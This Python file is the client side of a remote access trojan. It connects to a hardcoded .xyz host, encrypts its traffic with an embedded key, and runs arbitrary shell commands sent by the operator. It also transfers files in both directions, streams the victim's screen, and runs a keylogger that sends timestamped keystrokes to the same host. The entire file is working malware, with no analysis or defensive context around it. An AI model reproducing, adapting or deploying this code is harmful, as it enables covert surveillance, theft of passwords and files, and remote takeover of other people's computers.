import os, subprocess, socket, time, datetime
from cryptography.fernet import Fernet
from vidstream import ScreenShareClient
from pynput.keyboard import Key, Listener
from threading import Thread


SERVER_HOST = 'xn--6pw65a019d.xyz'
SERVER_PORT = 421
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
keyz = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
cwd = os.getcwd()
cwd = Fernet(keyz).encrypt(cwd.encode())
s.send(cwd)


while True:
    command = s.recv(BUFFER_SIZE)
    command = Fernet(keyz).decrypt(command).decode()
    splited_command = command.split()
    if command == "/sendfile":
        filename = s.recv(BUFFER_SIZE)
        filename = Fernet(keyz).decrypt(filename).decode()
        remaining = int.from_bytes(s.recv(4),'big')
        f = open(filename,"wb")
        while remaining:
            data = s.recv(min(remaining,4096))
            remaining -= len(data)
            f.write(data)
        f.close()
    if command == "/getfile":
        filename = s.recv(BUFFER_SIZE)
        filename = Fernet(keyz).decrypt(filename).decode()
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
    if command == "/getlive":
        sender = ScreenShareClient(SERVER_HOST, 423)
        t = Thread(target=sender.start_stream)
        t.start()
    if command == "/stop_getlive":
        sender.stop_stream()
    if command == "start keylogger":
        LOGGER_HOST = SERVER_HOST
        LOGGER_PORT = 422
        logger = socket.socket()
        logger.connect((LOGGER_HOST, LOGGER_PORT))  
        wordz = str()    
        def keylogger_loop():
            global runningzz
            runningzz = True
            def press(key):
                global wordz
                wordz += str(key)
                if key == Key.space or key == Key.enter:
                    contents = f"\n{wordz}\n"
                    contents = contents.replace("'", "")
                    contents = contents.replace("Key.space", "")
                    contents = contents.replace("Key.backspace", "")
                    contents = contents.replace("Key.shift", "")
                    contents = contents.replace("Key.alt", "")
                    contents = contents.replace("Key.enter", "")
                    contents = contents.replace("Key.alt_gr", "")
                    contents = contents.replace("Key.alt_l", "")
                    contents = contents.replace("Key.alt_r", "")
                    contents = contents.replace("Key.caps_lock", "")
                    contents = contents.replace("Key.cmd", "")
                    contents = contents.replace("Key.cmd_l", "")
                    contents = contents.replace("Key.cmd_r", "")
                    contents = contents.replace("Key.ctrl", "")
                    contents = contents.replace("Key.ctrl_l", "")
                    contents = contents.replace("Key.ctrl_r", "")
                    contents = contents.replace("Key.delete", "")
                    contents = contents.replace("Key.down", "")
                    contents = contents.replace("Key.end", "")
                    contents = contents.replace("Key.esc", "")
                    contents = contents.replace("Key.f1", "")
                    contents = contents.replace("Key.f2", "")
                    contents = contents.replace("Key.f3", "")
                    contents = contents.replace("Key.f4", "")
                    contents = contents.replace("Key.f5", "")
                    contents = contents.replace("Key.f6", "")
                    contents = contents.replace("Key.f7", "")
                    contents = contents.replace("Key.f8", "")
                    contents = contents.replace("Key.f9", "")
                    contents = contents.replace("Key.f10", "")
                    contents = contents.replace("Key.f11", "")
                    contents = contents.replace("Key.f12", "")
                    contents = contents.replace("Key.f13", "")
                    contents = contents.replace("Key.f14", "")
                    contents = contents.replace("Key.f15", "")
                    contents = contents.replace("Key.f16", "")
                    contents = contents.replace("Key.f17", "")
                    contents = contents.replace("Key.f18", "")
                    contents = contents.replace("Key.f19", "")
                    contents = contents.replace("Key.f20", "")
                    contents = contents.replace("Key.home", "")
                    contents = contents.replace("Key.insert", "")
                    contents = contents.replace("Key.left", "")
                    contents = contents.replace("Key.menu", "")
                    contents = contents.replace("Key.num_lock", "")
                    contents = contents.replace("Key.page_down", "")
                    contents = contents.replace("Key.page_up", "")
                    contents = contents.replace("Key.pause", "")
                    contents = contents.replace("Key.print_screen", "")
                    contents = contents.replace("Key.scroll_lock", "")
                    contents = contents.replace("Key.right", "")
                    contents = contents.replace("Key.shift_l", "")
                    contents = contents.replace("Key.shift_r", "")
                    contents = contents.replace("Key.tab", "")
                    contents = contents.replace("Key.up", "")
                    date_now = str(datetime.datetime.now())
                    contents =  "\n" + date_now + contents
                    logger.send(contents.encode())
                    wordz = str()
            while runningzz:
                with Listener(
                        on_press=press,) as listener:
                    listener.join()
        keyzlogger_loop = Thread(target=keylogger_loop)
        keyzlogger_loop.daemon = True
        keyzlogger_loop.start()
    if command == "stop keylogger":
        logger.close()
        runningzz = False
    if command.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":
        try:
            os.chdir(' '.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f"{output}{SEPARATOR}{cwd}"
    message = Fernet(keyz).encrypt(message.encode())
    if command != "/getfile" and command != "/sendfile" and command != "/getlive" and command != "/stop_getlive":
        s.send(message)
s.close()